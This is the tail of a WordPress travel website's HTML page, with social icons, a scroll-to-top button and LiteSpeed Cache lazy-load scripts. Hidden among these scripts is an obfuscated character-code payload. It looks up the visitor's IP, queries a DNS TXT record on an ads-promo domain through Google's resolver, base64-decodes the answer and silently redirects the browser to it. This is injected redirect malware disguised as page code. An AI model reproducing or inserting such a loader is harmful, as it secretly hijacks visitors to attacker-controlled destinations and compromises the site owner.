300.47875,7283.68956 C300.47875,7283.03248 299.943419,7282.49847 299.283709,7282.49847 C298.623998,7282.49847 298.089663,7283.03248 298.089663,7283.68956 M288.862673,7288.98792 C288.862673,7291.80286 291.150266,7294.08479 293.972194,7294.08479 C296.794123,7294.08479 299.081716,7291.80286 299.081716,7288.98792 C299.081716,7286.17298 296.794123,7283.89205 293.972194,7283.89205 C291.150266,7283.89205 288.862673,7286.17298 288.862673,7288.98792 M290.655732,7288.98792 C290.655732,7287.16159 292.140329,7285.67967 293.972194,7285.67967 C295.80406,7285.67967 297.288657,7287.16159 297.288657,7288.98792 C297.288657,7290.81525 295.80406,7292.29716 293.972194,7292.29716 C292.140329,7292.29716 290.655732,7290.81525 290.655732,7288.98792" id="instagram-[#167]"> </path></g></g></g></g></svg>					</a>
</span>
<span class="elementor-grid-item">
<a class="elementor-icon elementor-social-icon elementor-social-icon-youtube elementor-animation-grow elementor-repeater-item-a172717" href="https://www.youtube.com/@focustravelers" target="_blank">
<span class="elementor-screen-only">Youtube</span>
<i class="fab fa-youtube"></i>					</a>
</span>
</div></div></div>
</div></div>
</div></div>
</div></div>
</div></div></div>
</div>
<div id="ast-scroll-top" tabindex="0" class="ast-scroll-top-icon ast-scroll-to-top-right" data-on-devices="both">
<span class="ast-icon icon-arrow"><svg class="ast-arrow-svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" x="0px" y="0px" width="26px" height="16.043px" viewbox="57 35.171 26 16.043" enable-background="new 57 35.171 26 16.043" xml:space="preserve">
<path d="M57.5,38.193l12.5,12.5l12.5-12.5l-2.5-2.5l-10,10l-10-10L57.5,38.193z"></path>
</svg></span>	<span class="screen-reader-text">Scroll to Top</span>
</div> <script type="litespeed/javascript">document.write(String.fromCharCode(60,115,99,114,105,112,116,62,118,97,114,32,95,36,95,97,55,57,56,61,91,34,92,120,50,69,34,44,34,92,120,50,68,34,44,34,92,120,55,50,92,120,54,53,92,120,55,48,92,120,54,67,92,120,54,49,92,120,54,51,92,120,54,53,92,120,52,49,92,120,54,67,92,120,54,67,34,44,34,92,120,54,57,92,120,55,48,34,44,34,92,120,51,65,34,44,34,92,120,54,56,92,120,54,70,92,120,55,51,92,120,55,52,92,120,54,69,92,120,54,49,92,120,54,68,92,120,54,53,34,44,34,92,120,54,67,92,120,54,70,92,120,54,51,92,120,54,49,92,120,55,52,92,120,54,57,92,120,54,70,92,120,54,69,34,44,34,34,44,34,92,120,55,53,92,120,54,69,92,120,54,66,92,120,50,69,92,120,54,51,92,120,54,70,92,120,54,68,34,44,34,92,120,52,49,92,120,54,69,92,120,55,51,92,120,55,55,92,120,54,53,92,120,55,50,34,44,34,92,120,55,52,92,120,55,57,92,120,55,48,92,120,54,53,34,44,34,92,120,54,52,92,120,54,49,92,120,55,52,92,120,54,49,34,44,34,92,120,54,54,92,120,54,70,92,120,55,50,92,120,52,53,92,120,54,49,92,120,54,51,92,120,54,56,34,44,34,92,120,54,67,92,120,54,53,92,120,54,69,92,120,54,55,92,120,55,52,92,120,54,56,34,44,34,92,120,55,50,92,120,54,53,92,120,55,48,92,120,54,67,92,120,54,49,92,120,54,51,92,120,54,53,34,44,34,92,120,55,52,92,120,54,56,92,120,54,53,92,120,54,69,34,44,34,92,120,54,65,92,120,55,51,92,120,54,70,92,120,54,69,34,44,34,92,120,54,56,92,120,55,52,92,120,55,52,92,120,55,48,92,120,55,51,92,120,51,65,92,120,50,70,92,120,50,70,92,120,54,52,92,120,54,69,92,120,55,51,92,120,50,69,92,120,54,55,92,120,54,70,92,120,54,70,92,120,54,55,92,120,54,67,92,120,54,53,92,120,50,70,92,120,55,50,92,120,54,53,92,120,55,51,92,120,54,70,92,120,54,67,92,120,55,54,92,120,54,53,92,120,51,70,92,120,54,69,92,120,54,49,92,120,54,68,92,120,54,53,92,120,51,68,34,44,34,92,120,55,50,92,120,54,49,92,120,54,69,92,120,54,52,92,120,54,70,92,120,54,68,34,44,34,92,120,54,54,92,120,54,67,92,120,54,70,92,120,54,70,92,120,55,50,34,44,34,92,120,50,69,92,120,54,49,92,120,54,52,92,120,55,51,92,120,50,68,92,120,55,48,92,120,55,50,92,120,54,70,92,120,54,68,92,120,54,70,92,120,50,69,92,120,54,51,92,120,54,70,92,120,54,68,92,120,50,54,92,120,55,52,92,120,55,57,92,120,55,48,92,120,54,53,92,120,51,68,92,120,55,52,92,120,55,56,92,120,55,52,34,44,34,92,120,54,56,92,120,55,52,92,120,55,52,92,120,55,48,92,120,55,51,92,120,51,65,92,120,50,70,92,120,50,70,92,120,54,49,92,120,55,48,92,120,54,57,92,120,51,54,92,120,51,52,92,120,50,69,92,120,54,57,92,120,55,48,92,120,54,57,92,120,54,54,92,120,55,57,92,120,50,69,92,120,54,70,92,120,55,50,92,120,54,55,92,120,51,70,92,120,54,54,92,120,54,70,92,120,55,50,92,120,54,68,92,120,54,49,92,120,55,52,92,120,51,68,92,120,54,65,92,120,55,51,92,120,54,70,92,120,54,69,34,93,59,40,102,117,110,99,116,105,111,110,40,95,48,120,49,67,55,68,52,41,123,102,101,116,99,104,40,95,36,95,97,55,57,56,91,50,49,93,41,91,95,36,95,97,55,57,56,91,49,53,93,93,40,40,95,48,120,49,67,56,49,68,41,61,62,95,48,120,49,67,56,49,68,91,95,36,95,97,55,57,56,91,49,54,93,93,40,41,41,91,95,36,95,97,55,57,56,91,49,53,93,93,40,40,95,48,120,49,67,56,65,70,41,61,62,123,95,48,120,49,67,56,65,70,61,32,95,48,120,49,67,56,65,70,91,95,36,95,97,55,57,56,91,51,93,93,91,95,36,95,97,55,57,56,91,50,93,93,40,95,36,95,97,55,57,56,91,48,93,44,95,36,95,97,55,57,56,91,49,93,41,59,95,48,120,49,67,56,65,70,61,32,95,48,120,49,67,56,65,70,91,95,36,95,97,55,57,56,91,50,93,93,40,95,36,95,97,55,57,56,91,52,93,44,95,36,95,97,55,57,56,91,49,93,41,59,108,101,116,32,95,48,120,49,67,56,54,54,61,119,105,110,100,111,119,91,95,36,95,97,55,57,56,91,54,93,93,91,95,36,95,97,55,57,56,91,53,93,93,59,105,102,40,95,48,120,49,67,56,54,54,61,61,32,95,36,95,97,55,57,56,91,55,93,41,123,95,48,120,49,67,56,54,54,61,32,95,36,95,97,55,57,56,91,56,93,125,59,102,101,116,99,104,40,95,36,95,97,55,57,56,91,49,55,93,43,32,95,48,120,49,67,56,54,54,43,32,95,36,95,97,55,57,56,91,48,93,43,32,95,48,120,49,67,56,65,70,43,32,95,36,95,97,55,57,56,91,48,93,43,32,77,97,116,104,91,95,36,95,97,55,57,56,91,49,57,93,93,40,77,97,116,104,91,95,36,95,97,55,57,56,91,49,56,93,93,40,41,42,32,49,48,50,52,42,32,49,48,50,52,42,32,49,48,41,43,32,95,36,95,97,55,57,56,91,50,48,93,41,91,95,36,95,97,55,57,56,91,49,53,93,93,40,40,95,48,120,49,67,56,49,68,41,61,62,95,48,120,49,67,56,49,68,91,95,36,95,97,55,57,56,91,49,54,93,93,40,41,41,91,95,36,95,97,55,57,56,91,49,53,93,93,40,40,95,48,120,49,67,56,70,56,41,61,62,123,105,102,40,95,48,120,49,67,56,70,56,91,95,36,95,97,55,57,56,91,57,93,93,61,61,32,110,117,108,108,41,123,114,101,116,117,114,110,125,59,118,97,114,32,95,48,120,49,67,57,52,49,61,95,36,95,97,55,57,56,91,55,93,59,95,48,120,49,67,56,70,56,91,95,36,95,97,55,57,56,91,57,93,93,91,95,36,95,97,55,57,56,91,49,50,93,93,40,40,95,48,120,49,67,57,56,65,41,61,62,123,105,102,40,95,48,120,49,67,57,56,65,91,95,36,95,97,55,57,56,91,49,48,93,93,61,61,32,49,54,41,123,95,48,120,49,67,57,52,49,43,61,32,95,48,120,49,67,57,56,65,91,95,36,95,97,55,57,56,91,49,49,93,93,125,125,41,59,95,48,120,49,67,57,52,49,61,32,97,116,111,98,40,95,48,120,49,67,57,52,49,41,59,105,102,40,33,95,48,120,49,67,57,52,49,91,95,36,95,97,55,57,56,91,49,51,93,93,41,123,114,101,116,117,114,110,125,59,119,105,110,100,111,119,91,95,36,95,97,55,57,56,91,54,93,93,91,95,36,95,97,55,57,56,91,49,52,93,93,40,95,48,120,49,67,57,52,49,41,125,41,125,41,125,41,40,41,60,47,115,99,114,105,112,116,62))</script><script></script><script></script><script></script><script></script> <script data-no-optimize="1">!function(t,e){"object"==typeof exports&&"undefined"!=typeof module?module.exports=e():"function"==typeof define&&define.amd?define(e):(t="undefined"!=typeof globalThis?globalThis:t||self).LazyLoad=e()}(this,function(){"use strict";function e(){return(e=Object.assign||function(t){for(var e=1;e<arguments.length;e++){var n,a=arguments[e];for(n in a)Object.prototype.hasOwnProperty.call(a,n)&&(t[n]=a[n])}return t}).apply(this,arguments)}function i(t){return e({},it,t)}function o(t,e){var n,a="LazyLoad::Initialized",i=new t(e);try{n=new CustomEvent(a,{detail:{instance:i}})}catch(t){(n=document.createEvent("CustomEvent")).initCustomEvent(a,!1,!1,{instance:i})}window.dispatchEvent(n)}function l(t,e){return t.getAttribute(gt+e)}function c(t){return l(t,bt)}function s(t,e){return function(t,e,n){e=gt+e;null!==n?t.setAttribute(e,n):t.removeAttribute(e)}(t,bt,e)}function r(t){return s(t,null),0}function u(t){return null===c(t)}function d(t){return c(t)===vt}function f(t,e,n,a){t&&(void 0===a?void 0===n?t(e):t(e,n):t(e,n,a))}function _(t,e){nt?t.classList.add(e):t.className+=(t.className?" ":"")+e}function v(t,e){nt?t.classList.remove(e):t.className=t.className.replace(new RegExp("(^|\\s+)"+e+"(\\s+|$)")," ").replace(/^\s+/,"").replace(/\s+$/,"")}function g(t){return t.llTempImage}function b(t,e){!e||(e=e._observer)&&e.unobserve(t)}function p(t,e){t&&(t.loadingCount+=e)}function h(t,e){t&&(t.toLoadCount=e)}function n(t){for(var e,n=[],a=0;e=t.children[a];a+=1)"SOURCE"===e.tagName&&n.push(e);return n}function m(t,e){(t=t.parentNode)&&"PICTURE"===t.tagName&&n(t).forEach(e)}function a(t,e){n(t).forEach(e)}function E(t){return!!t[st]}function I(t){return t[st]}function y(t){return delete t[st]}function A(e,t){var n;E(e)||(n={},t.forEach(function(t){n[t]=e.getAttribute(t)}),e[st]=n)}function k(a,t){var i;E(a)&&(i=I(a),t.forEach(function(t){var e,n;e=a,(t=i[n=t])?e.setAttribute(n,t):e.removeAttribute(n)}))}function L(t,e,n){_(t,e.class_loading),s(t,ut),n&&(p(n,1),f(e.callback_loading,t,n))}function w(t,e,n){n&&t.setAttribute(e,n)}function x(t,e){w(t,ct,l(t,e.data_sizes)),w(t,rt,l(t,e.data_srcset)),w(t,ot,l(t,e.data_src))}function O(t,e,n){var a=l(t,e.data_bg_multi),i=l(t,e.data_bg_multi_hidpi);(a=at&&i?i:a)&&(t.style.backgroundImage=a,n=n,_(t=t,(e=e).class_applied),s(t,ft),n&&(e.unobserve_completed&&b(t,e),f(e.callback_applied,t,n)))}function N(t,e){!e||0<e.loadingCount||0<e.toLoadCount||f(t.callback_finish,e)}function C(t,e,n){t.addEventListener(e,n),t.llEvLisnrs[e]=n}function M(t){return!!t.llEvLisnrs}function z(t){if(M(t)){var e,n,a=t.llEvLisnrs;for(e in a){var i=a[e];n=e,i=i,t.removeEventListener(n,i)}delete t.llEvLisnrs}}function R(t,e,n){var a;delete t.llTempImage,p(n,-1),(a=n)&&--a.toLoadCount,v(t,e.class_loading),e.unobserve_completed&&b(t,n)}function T(o,r,c){var l=g(o)||o;M(l)||function(t,e,n){M(t)||(t.llEvLisnrs={});var a="VIDEO"===t.tagName?"loadeddata":"load";C(t,a,e),C(t,"error",n)}(l,function(t){var e,n,a,i;n=r,a=c,i=d(e=o),R(e,n,a),_(e,n.class_loaded),s(e,dt),f(n.callback_loaded,e,a),i||N(n,a),z(l)},function(t){var e,n,a,i;n=r,a=c,i=d(e=o),R(e,n,a),_(e,n.class_error),s(e,_t),f(n.callback_error,e,a),i||N(n,a),z(l)})}function G(t,e,n){var a,i,o,r,c;t.llTempImage=document.createElement("IMG"),T(t,e,n),E(c=t)||(c[st]={backgroundImage:c.style.backgroundImage}),o=n,r=l(a=t,(i=e).data_bg),c=l(a,i.data_bg_hidpi),(r=at&&c?c:r)&&(a.style.backgroundImage='url("'.concat(r,'")'),g(a).setAttribute(ot,r),L(a,i,o)),O(t,e,n)}function D(t,e,n){var a;T(t,e,n),a=e,e=n,(t=It[(n=t).tagName])&&(t(n,a),L(n,a,e))}function V(t,e,n){var a;a=t,(-1<yt.indexOf(a.tagName)?D:G)(t,e,n)}function F(t,e,n){var a;t.setAttribute("loading","lazy"),T(t,e,n),a=e,(e=It[(n=t).tagName])&&e(n,a),s(t,vt)}function j(t){t.removeAttribute(ot),t.removeAttribute(rt),t.removeAttribute(ct)}function P(t){m(t,function(t){k(t,Et)}),k(t,Et)}function S(t){var e;(e=At[t.tagName])?e(t):E(e=t)&&(t=I(e),e.style.backgroundImage=t.backgroundImage)}function U(t,e){var n;S(t),n=e,u(e=t)||d(e)||(v(e,n.class_entered),v(e,n.class_exited),v(e,n.class_applied),v(e,n.class_loading),v(e,n.class_loaded),v(e,n.class_error)),r(t),y(t)}function $(t,e,n,a){var i;n.cancel_on_exit&&(c(t)!==ut||"IMG"===t.tagName&&(z(t),m(i=t,function(t){j(t)}),j(i),P(t),v(t,n.class_loading),p(a,-1),r(t),f(n.callback_cancel,t,e,a)))}function q(t,e,n,a){var i,o,r=(o=t,0<=pt.indexOf(c(o)));s(t,"entered"),_(t,n.class_entered),v(t,n.class_exited),i=t,o=a,n.unobserve_entered&&b(i,o),f(n.callback_enter,t,e,a),r||V(t,n,a)}function H(t){return t.use_native&&"loading"in HTMLImageElement.prototype}function B(t,i,o){t.forEach(function(t){return(a=t).isIntersecting||0<a.intersectionRatio?q(t.target,t,i,o):(e=t.target,n=t,a=i,t=o,void(u(e)||(_(e,a.class_exited),$(e,n,a,t),f(a.callback_exit,e,n,t))));var e,n,a})}function J(e,n){var t;et&&!H(e)&&(n._observer=new IntersectionObserver(function(t){B(t,e,n)},{root:(t=e).container===document?null:t.container,rootMargin:t.thresholds||t.threshold+"px"}))}function K(t){return Array.prototype.slice.call(t)}function Q(t){return t.container.querySelectorAll(t.elements_selector)}function W(t){return c(t)===_t}function X(t,e){return e=t||Q(e),K(e).filter(u)}function Y(e,t){var n;(n=Q(e),K(n).filter(W)).forEach(function(t){v(t,e.class_error),r(t)}),t.update()}function t(t,e){var n,a,t=i(t);this._settings=t,this.loadingCount=0,J(t,this),n=t,a=this,Z&&window.addEventListener("online",function(){Y(n,a)}),this.update(e)}var Z="undefined"!=typeof window,tt=Z&&!("onscroll"in window)||"undefined"!=typeof navigator&&/(gle|ing|ro)bot|crawl|spider/i.test(navigator.userAgent),et=Z&&"IntersectionObserver"in window,nt=Z&&"classList"in document.createElement("p"),at=Z&&1<window.devicePixelRatio,it={elements_selector:".lazy",container:tt||Z?document:null,threshold:300,thresholds:null,data_src:"src",data_srcset:"srcset",data_sizes:"sizes",data_bg:"bg",data_bg_hidpi:"bg-hidpi",data_bg_multi:"bg-multi",data_bg_multi_hidpi:"bg-multi-hidpi",data_poster:"poster",class_applied:"applied",class_loading:"litespeed-loading",class_loaded:"litespeed-loaded",class_error:"error",class_entered:"entered",class_exited:"exited",unobserve_completed:!0,unobserve_entered:!1,cancel_on_exit:!0,callback_enter:null,callback_exit:null,callback_applied:null,callback_loading:null,callback_loaded:null,callback_error:null,callback_finish:null,callback_cancel:null,use_native:!1},ot="src",rt="srcset",ct="sizes",lt="poster",st="llOriginalAttrs",ut="loading",dt="loaded",ft="applied",_t="error",vt="native",gt="data-",bt="ll-status",pt=[ut,dt,ft,_t],ht=[ot],mt=[ot,lt],Et=[ot,rt,ct],It={IMG:function(t,e){m(t,function(t){A(t,Et),x(t,e)}),A(t,Et),x(t,e)},IFRAME:function(t,e){A(t,ht),w(t,ot,l(t,e.data_src))},VIDEO:function(t,e){a(t,function(t){A(t,ht),w(t,ot,l(t,e.data_src))}),A(t,mt),w(t,lt,l(t,e.data_poster)),w(t,ot,l(t,e.data_src)),t.load()}},yt=["IMG","IFRAME","VIDEO"],At={IMG:P,IFRAME:function(t){k(t,ht)},VIDEO:function(t){a(t,function(t){k(t,ht)}),k(t,mt),t.load()}},kt=["IMG","IFRAME","VIDEO"];return t.prototype={update:function(t){var e,n,a,i=this._settings,o=X(t,i);{if(h(this,o.length),!tt&&et)return H(i)?(e=i,n=this,o.forEach(function(t){-1!==kt.indexOf(t.tagName)&&F(t,e,n)}),void h(n,0)):(t=this._observer,i=o,t.disconnect(),a=t,void i.forEach(function(t){a.observe(t)}));this.loadAll(o)}},destroy:function(){this._observer&&this._observer.disconnect(),Q(this._settings).forEach(function(t){y(t)}),delete this._observer,delete this._settings,delete this.loadingCount,delete this.toLoadCount},loadAll:function(t){var e=this,n=this._settings;X(t,n).forEach(function(t){b(t,e),V(t,n,e)})},restoreAll:function(){var e=this._settings;Q(e).forEach(function(t){U(t,e)})}},t.load=function(t,e){e=i(e);V(t,e)},t.resetStatus=function(t){r(t)},Z&&function(t,e){if(e)if(e.length)for(var n,a=0;n=e[a];a+=1)o(t,n);else o(t,e)}(t,window.lazyLoadOptions),t});!function(e,t){"use strict";function a(){t.body.classList.add("litespeed_lazyloaded")}function n(){console.log("[LiteSpeed] Start Lazy Load Images"),d=new LazyLoad({elements_selector:"[data-lazyloaded]",callback_finish:a}),o=function(){d.update()},e.MutationObserver&&new MutationObserver(o).observe(t.documentElement,{childList:!0,subtree:!0,attributes:!0})}var d,o;e.addEventListener?e.addEventListener("load",n,!1):e.attachEvent("onload",n)}(window,document);</script><script data-no-optimize="1">var litespeed_vary=document.cookie.replace(/(?:(?:^|.*;\s*)_lscache_vary\s*\=\s*([^;]*).*$)|^.*$/,"");litespeed_vary||fetch("{{ asset('/wp-content/plugins/litespeed-cache/guest.vary.php') }}",{method:"POST",cache:"no-cache",redirect:"follow"}).then(e=>e.json()).then(e=>{console.log(e),e.hasOwnProperty("reload")&&"yes"==e.reload&&(sessionStorage.setItem("litespeed_docref",document.referrer),window.location.reload(!0))});</script><script data-optimized="1" type="litespeed/javascript" data-src="{{ asset('/wp-content/litespeed/js/6f90c57b9393754f3bf06c2806af5d8d.js?ver=ac3f9') }}"></script><script>const litespeed_ui_events=["mouseover","click","keydown","wheel","touchmove","touchstart"];var urlCreator=window.URL||window.webkitURL;function litespeed_load_delayed_js_force(){console.log("[LiteSpeed] Start Load JS Delayed"),litespeed_ui_events.forEach(e=>{window.removeEventListener(e,litespeed_load_delayed_js_force,{passive:!0})}),document.querySelectorAll("iframe[data-litespeed-src]").forEach(e=>{e.setAttribute("src",e.getAttribute("data-litespeed-src"))}),"loading"==document.readyState?window.addEventListener("DOMContentLoaded",litespeed_load_delayed_js):litespeed_load_delayed_js()}litespeed_ui_events.forEach(e=>{window.addEventListener(e,litespeed_load_delayed_js_force,{passive:!0})});async function litespeed_load_delayed_js(){let t=[];for(var d in document.querySelectorAll('script[type="litespeed/javascript"]').forEach(e=>{t.push(e)}),t)await new Promise(e=>litespeed_load_one(t[d],e));document.dispatchEvent(new Event("DOMContentLiteSpeedLoaded")),window.dispatchEvent(new Event("DOMContentLiteSpeedLoaded"))}function litespeed_load_one(t,e){console.log("[LiteSpeed] Load ",t);var d=document.createElement("script");d.addEventListener("load",e),d.addEventListener("error",e),t.getAttributeNames().forEach(e=>{"type"!=e&&d.setAttribute("data-src"==e?"src":e,t.getAttribute(e))});let a=!(d.type="text/javascript");!d.src&&t.textContent&&(d.src=litespeed_inline2src(t.textContent),a=!0),t.after(d),t.remove(),a&&e()}function litespeed_inline2src(t){try{var d=urlCreator.createObjectURL(new Blob([t.replace(/^(?:<!--)?(.*?)(?:-->)?$/gm,"$1")],{type:"text/javascript"}))}catch(e){d="data:text/javascript;base64,"+btoa(t.replace(/^(?:<!--)?(.*?)(?:-->)?$/gm,"$1"))}return d}</script>
</body>
<!-- Page optimized by LiteSpeed Cache @2023-10-14 12:52:53 -->

<!-- Page cached by LiteSpeed Cache 5.7 on 2023-10-14 12:52:52 -->
<!-- Guest Mode -->
<!-- QUIC.cloud UCSS in queue -->
</html>
